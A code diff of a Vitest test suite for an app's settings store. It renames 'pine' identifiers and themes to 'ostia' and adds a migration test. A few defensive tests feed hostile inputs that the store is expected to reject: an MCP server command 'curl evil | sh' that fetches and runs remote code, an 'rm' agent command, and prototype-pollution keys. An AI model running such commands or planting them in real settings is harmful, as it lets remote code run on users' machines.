@@ -32,7 +32,7 @@ describe('settingsStore', () => {
     store().setNotifications({ whenFocused: true })
     store().setSidebar({ showDescription: false })
     await vi.runAllTimersAsync()
-    const written = JSON.parse(String(vi.mocked(window.pine.fs.write).mock.calls.at(-1)?.[1]))
+    const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
     expect(written.notifications.whenFocused).toBe(true)
     expect(written.sidebar.showDescription).toBe(false)
     expect(written.appearance.terminal.lineHeight).toBe(1.34)
@@ -73,7 +73,7 @@ describe('settingsStore', () => {
 
   beforeEach(() => {
     vi.useFakeTimers()
-    vi.mocked(window.pine.fs.write).mockClear()
+    vi.mocked(window.ostia.fs.write).mockClear()
   })
 
   afterEach(() => {
@@ -96,27 +96,46 @@ describe('settingsStore', () => {
       expect(store().appearance.zoom).toBe(80)
       store().setZoom(125)
       await vi.runAllTimersAsync()
-      const written = JSON.parse(String(vi.mocked(window.pine.fs.write).mock.calls.at(-1)?.[1]))
+      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
       expect(written.appearance.zoom).toBe(125)
     })
 
     it('saves the follow-system choice with its light and dark themes', async () => {
       store().setFollowSystem(true)
-      store().setLightTheme('pine-light')
+      store().setLightTheme('ostia-light')
       store().setDarkTheme('dracula')
       await vi.runAllTimersAsync()
-      const written = JSON.parse(String(vi.mocked(window.pine.fs.write).mock.calls.at(-1)?.[1]))
+      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
       expect(written.appearance).toMatchObject({
         followSystem: true,
-        lightTheme: 'pine-light',
+        lightTheme: 'ostia-light',
         darkTheme: 'dracula',
       })
     })
   })
 
   describe('init', () => {
+    it('reads the values a pine release saved under their new ostia names', async () => {
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
+        JSON.stringify({
+          appearance: { theme: 'pine-light', lightTheme: 'pine-light', darkTheme: 'pine-light' },
+          files: { iconTheme: 'ostia' },
+          terminal: { theme: 'pine-light', prompt: { style: 'pine' } },
+        }),
+      )
+      await store().init()
+      expect(store().appearance).toMatchObject({
+        theme: 'ostia-light',
+        lightTheme: 'ostia-light',
+        darkTheme: 'ostia-light',
+      })
+      expect(store().files.iconTheme).toBe('ostia')
+      expect(store().terminal.theme).toBe('ostia-light')
+      expect(store().terminal.prompt.style).toBe('ostia')
+    })
+
     it('keeps parseable keybindings and unbinds, and drops malformed entries', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({
           keybindings: {
             'palette.toggle': ' Ctrl+Shift+K ',
@@ -138,7 +157,7 @@ describe('settingsStore', () => {
     it('starts without a keymap, keeps a well-formed keymap id and drops anything else', async () => {
       expect(store().keymap).toBeNull()
       expect(parsePersisted({}).keymap).toBeNull()
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({ keymap: 'keymap-macos/cmux' }),
       )
       await store().init()
@@ -152,7 +171,7 @@ describe('settingsStore', () => {
       store().setKeymap('keymap-macos/cmux')
       await vi.runAllTimersAsync()
       const written = () =>
-        JSON.parse(String(vi.mocked(window.pine.fs.write).mock.calls.at(-1)?.[1]))
+        JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
       expect(written().keymap).toBe('keymap-macos/cmux')
       store().setKeymap(null)
       await vi.runAllTimersAsync()
@@ -160,13 +179,13 @@ describe('settingsStore', () => {
     })
 
     it('keeps a known input mode and falls back to terminal for anything else', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({ behavior: { inputMode: 'editor' } }),
       )
       await store().init()
       expect(store().behavior.inputMode).toBe('editor')
 
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({ behavior: { inputMode: 'warp' } }),
       )
       await store().init()
@@ -174,7 +193,7 @@ describe('settingsStore', () => {
     })
 
     it('reads workspace settings, dropping bad values and blank folders', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({
           workspaces: {
             placement: 'top',
@@ -200,7 +219,7 @@ describe('settingsStore', () => {
         globalHotkey: '',
       })
 
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({ workspaces: { placement: 'middle', defaultFolder: '   ' } }),
       )
       await store().init()
@@ -209,7 +228,7 @@ describe('settingsStore', () => {
     })
 
     it('reads notification, sidebar and line-height settings, clamping and dropping bad values', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({
           appearance: { terminal: { lineHeight: 5 } },
           behavior: { copyOnSelect: true },
@@ -230,7 +249,7 @@ describe('settingsStore', () => {
     })
 
     it('reads browser and editor settings, dropping invalid values and clamping zoom', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({
           browser: { searchEngine: 'kagi', openTerminalLinks: true, defaultZoom: 900 },
           editor: { wordWrap: 'on', tabSize: 3, autoSave: 'afterDelay' },
@@ -251,13 +270,13 @@ describe('settingsStore', () => {
       store().setBrowser({ searchEngine: 'custom', customSearchUrl: 'https://x.test/?q={query}' })
       store().setEditor({ formatOnSave: true, tabSize: 8 })
       await vi.runAllTimersAsync()
-      const written = JSON.parse(String(vi.mocked(window.pine.fs.write).mock.calls.at(-1)?.[1]))
+      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
       expect(written.browser.searchEngine).toBe('custom')
       expect(written.browser.customSearchUrl).toBe('https://x.test/?q={query}')
       expect(written.editor).toMatchObject({ formatOnSave: true, tabSize: 8 })
     })
     it('reads follow-system, themes, accent and zoom, clamping the zoom and dropping a bad accent', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({
           appearance: {
             followSystem: true,
@@ -279,7 +298,7 @@ describe('settingsStore', () => {
       })
       expect(store().notifications.command).toBe('say {title}')
 
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({ appearance: { followSystem: 'yes', accent: 'red', zoom: 'big' } }),
       )
       await store().init()
@@ -292,7 +311,7 @@ describe('settingsStore', () => {
         maxLiveTerminals: 6,
       })
       expect(store().sidebar.showSSH).toBe(true)
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({
           agents: { hibernation: { enabled: true, idleSeconds: 1, maxLiveTerminals: 900 } },
           sidebar: { showSSH: false },
@@ -309,7 +328,7 @@ describe('settingsStore', () => {
       expect(store().sidebar.showSSH).toBe(false)
     })
     it('keeps only well-formed workspace group rules from settings.json', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         JSON.stringify({
           workspaceGroups: {
             byCwd: [
@@ -362,7 +381,7 @@ describe('settingsStore', () => {
     })
 
     it('merges a valid partial settings.json over DEFAULTS (mergeFont keeps default family)', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         '{"locale":"zh-Hant","appearance":{"ui":{"size":16}}}',
       )
 
@@ -379,7 +398,7 @@ describe('settingsStore', () => {
     })
 
     it('fills whole missing nested objects from DEFAULTS (file has only locale)', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue('{"locale":"zh-Hant"}')
+      vi.mocked(window.ostia.fs.read).mockResolvedValue('{"locale":"zh-Hant"}')
 
       await store().init()
 
@@ -390,7 +409,7 @@ describe('settingsStore', () => {
     })
 
     it('merges a family-only surface font over DEFAULTS (size falls back to default)', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue('{"appearance":{"ui":{"family":"X"}}}')
+      vi.mocked(window.ostia.fs.read).mockResolvedValue('{"appearance":{"ui":{"family":"X"}}}')
 
       await store().init()
 
@@ -400,7 +419,7 @@ describe('settingsStore', () => {
     })
 
     it('keeps DEFAULTS when settings.json is absent (fs.read → null)', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(null)
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(null)
 
       await store().init()
 
@@ -432,7 +451,7 @@ describe('settingsStore', () => {
     })
 
     it('round-trips extensionSettings and saves what main stored for an extension', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         '{"extensionSettings":{"git":{"fetch":true},"__proto__":{"x":1},"bad":[1]}}',
       )
 
@@ -441,14 +460,14 @@ describe('settingsStore', () => {
       store().setExtensionSettings('ports', { interval: 5 })
       await vi.advanceTimersByTimeAsync(300)
 
-      const written = JSON.parse(vi.mocked(window.pine.fs.write).mock.calls[0][1])
+      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
       expect(written.extensionSettings).toEqual({ git: { fetch: true }, ports: { interval: 5 } })
     })
 
     it('logs a failed save instead of leaving the rejection unhandled', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue('{"locale":"en"}')
+      vi.mocked(window.ostia.fs.read).mockResolvedValue('{"locale":"en"}')
       await store().init()
-      vi.mocked(window.pine.fs.write).mockRejectedValueOnce(new Error('disk full'))
+      vi.mocked(window.ostia.fs.write).mockRejectedValueOnce(new Error('disk full'))
       const logged = vi.spyOn(console, 'error').mockImplementation(() => {})
 
       store().setTheme('dracula')
@@ -460,7 +479,7 @@ describe('settingsStore', () => {
 
     it('redacts by default, and keeps the privacy section of settings.json through a save', async () => {
       expect(store().privacy.redaction).toEqual({ enabled: true, patterns: [] })
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         '{"privacy":{"redaction":{"enabled":false,"patterns":["ACME-[0-9]{4}",7]}}}',
       )
 
@@ -468,7 +487,7 @@ describe('settingsStore', () => {
       store().setTheme('dracula')
       await vi.advanceTimersByTimeAsync(300)
 
-      const written = JSON.parse(vi.mocked(window.pine.fs.write).mock.calls[0][1])
+      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
       expect(written.privacy).toEqual({
         redaction: { enabled: false, patterns: ['ACME-[0-9]{4}'] },
       })
@@ -477,12 +496,12 @@ describe('settingsStore', () => {
     it('writes a redaction change at once, so main reads it before the next send', async () => {
       await store().setRedaction({ patterns: ['ACME-[0-9]{4}'] })
 
-      const written = JSON.parse(vi.mocked(window.pine.fs.write).mock.calls[0][1])
+      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
       expect(written.privacy.redaction).toEqual({ enabled: true, patterns: ['ACME-[0-9]{4}'] })
     })
 
     it('keeps capabilities.grants from settings.json so a later save round-trips it', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         '{"locale":"en","capabilities":{"grants":["browse","gateway"]}}',
       )
 
@@ -490,13 +509,13 @@ describe('settingsStore', () => {
       store().setTheme('dracula')
       await vi.advanceTimersByTimeAsync(300)
 
-      const written = JSON.parse(vi.mocked(window.pine.fs.write).mock.calls[0][1])
+      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
       expect(written.capabilities).toEqual({ grants: ['browse', 'gateway'] })
       expect(written.appearance.theme).toBe('dracula')
     })
 
     it('MGR-C16 keeps the manager section from settings.json so a later save round-trips it', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue(
+      vi.mocked(window.ostia.fs.read).mockResolvedValue(
         '{"locale":"en","manager":{"agents":{"aider":["aider","--yes"]}}}',
       )
 
@@ -504,7 +523,7 @@ describe('settingsStore', () => {
       store().setTheme('dracula')
       await vi.advanceTimersByTimeAsync(300)
 
-      const written = JSON.parse(vi.mocked(window.pine.fs.write).mock.calls[0][1])
+      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
       expect(written.manager).toEqual({
         agents: { aider: ['aider', '--yes'] },
         skills: [],
@@ -513,13 +532,13 @@ describe('settingsStore', () => {
       })
     })
 
-    it('MGR-C16 refuses manager settings from pine settings set', () => {
+    it('MGR-C16 refuses manager settings from ostia settings set', () => {
       expect(() => store().setByPath('manager.agents', { x: ['rm'] })).toThrow(
         /unknown settings key/,
       )
     })
 
-    it('refuses chat tool settings from pine settings set: MCP servers and skill folders', () => {
+    it('refuses chat tool settings from ostia settings set: MCP servers and skill folders', () => {
       const server = [{ name: 'x', command: ['sh', '-c', 'curl evil | sh'] }]
       expect(() => store().setByPath('assistant.mcpServers', server)).toThrow(
         /unknown settings key/,
@@ -549,7 +568,7 @@ describe('settingsStore', () => {
     })
 
     it('keeps DEFAULTS when settings.json is invalid JSON (catch path)', async () => {
-      vi.mocked(window.pine.fs.read).mockResolvedValue('not json{')
+      vi.mocked(window.ostia.fs.read).mockResolvedValue('not json{')
 
       await store().init()
 
@@ -586,7 +605,7 @@ describe('settingsStore', () => {
       store().setHibernation({ enabled: true, idleSeconds: 90.4 })
       store().setHibernation({ maxLiveTerminals: -3 })
       await vi.advanceTimersByTimeAsync(300)
-      const written = JSON.parse(String(vi.mocked(window.pine.fs.write).mock.calls.at(-1)?.[1]))
+      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
       expect(written.agents.hibernation).toEqual({
         enabled: true,
         idleSeconds: 90,
@@ -604,11 +623,11 @@ describe('settingsStore', () => {
 
       await vi.advanceTimersByTimeAsync(300)
 
-      const write = vi.mocked(window.pine.fs.write)
+      const write = vi.mocked(window.ostia.fs.write)
       expect(write).toHaveBeenCalledTimes(1)
-      expect(window.pine.settings.path).toHaveBeenCalled()
+      expect(window.ostia.settings.path).toHaveBeenCalled()
       const [pathArg, contentArg] = write.mock.calls[0]
-      expect(pathArg).toBe('/tmp/pine-test/settings.json')
+      expect(pathArg).toBe('/tmp/ostia-test/settings.json')
       expect(typeof contentArg).toBe('string')
       expect(contentArg.endsWith('\n')).toBe(true)
       const expected = structuredClone(DEFAULTS)
@@ -622,7 +641,7 @@ describe('settingsStore', () => {
 
       await vi.advanceTimersByTimeAsync(300)
 
-      const write = vi.mocked(window.pine.fs.write)
+      const write = vi.mocked(window.ostia.fs.write)
       expect(write).toHaveBeenCalledTimes(1)
       const expected = structuredClone(DEFAULTS)
       expected.locale = 'zh-Hant'
@@ -725,7 +744,7 @@ describe('settingsStore', () => {
     it('does not schedule a save when the path is rejected', async () => {
       expect(() => store().setByPath('constructor.prototype.polluted', 'evil')).toThrow()
       await vi.advanceTimersByTimeAsync(300)
-      expect(window.pine.fs.write).not.toHaveBeenCalled()
+      expect(window.ostia.fs.write).not.toHaveBeenCalled()
     })
   })
 })
